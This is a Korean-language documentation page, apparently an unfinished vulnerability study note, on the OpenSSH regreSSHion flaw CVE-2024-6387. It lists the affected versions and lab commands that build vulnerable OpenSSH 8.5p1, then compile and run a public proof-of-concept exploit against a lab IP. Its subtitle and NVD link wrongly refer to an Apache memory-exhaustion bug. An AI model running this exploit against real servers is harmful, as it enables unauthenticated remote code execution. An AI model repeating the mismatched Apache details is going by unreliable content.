---
layout: default
title: cve-2024-6387
category: "OpenSSH"
nav_order: 3
parent: cve
---

# CVE-2024-6387 [수정 중]
{: .no_toc }

Apache 서버 메모리 고갈 취약점
{: .fs-6 .fw-300 }

[NVD][NVD]{: .btn .fs-5 .mb-4 .mb-md-0 target="_blank"}
[Apache][Apache]{: .btn .fs-5 .mb-4 .mb-md-0 target="_blank"}

1. TOC
{:toc}

--- 

## 1.1 취약점 요약
OpenSSH 비동기 신호 처리의 경합 조건으로 인해 인증되지 않은 공격자가 임의의 코드를 실행할 수 있는 취약점

{: .note-title }
> **비동기 신호 처리**는 시스템 프로그래밍에서 특정 이벤트가 발생할 때 운영 체제가 실행 중인 프로그램의 흐름을 일시적으로 중단하고, 미리 등록된 신호 처리기(signal handler)를 호출하여 해당 이벤트를 처리하는 메커니즘

## 1.2 취약 대상
OpenSSH 8.5p1 ~ 9.8p1

## 1.3 공격 원리
- 


## 1.4 환경 구현
## poc 환경 둘다 취약한 openssh 버전 필요
sudo apt update
sudo apt upgrade
sudo apt install build-essential autoconf automake libtool pkg-config
sudo apt install build-essential libssl-dev zlib1g-dev

sudo useradd -r -d /var/run/sshd -s /usr/sbin/nologin sshd

wget https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-8.5p1.tar.gz
tar -xzf openssh-8.5p1.tar.gz
cd openssh-8.5p1
./configure --without-zlib-version-check
make
sudo make install

sudo /usr/local/sbin/sshd
ps aux | grep sshd


git clone https://github.com/lflare/cve-2024-6387-poc.git
cd cve-2024-6387-poc

sudo apt install libssl-dev
gcc -o regresshion 7etsuo-regreSSHion.c -lcrypto

./regresshion 192.168.72.1

---

[NVD]: https://nvd.nist.gov/vuln/detail/CVE-2024-27316
[Apache]: https://httpd.apache.org/security/vulnerabilities_24.html
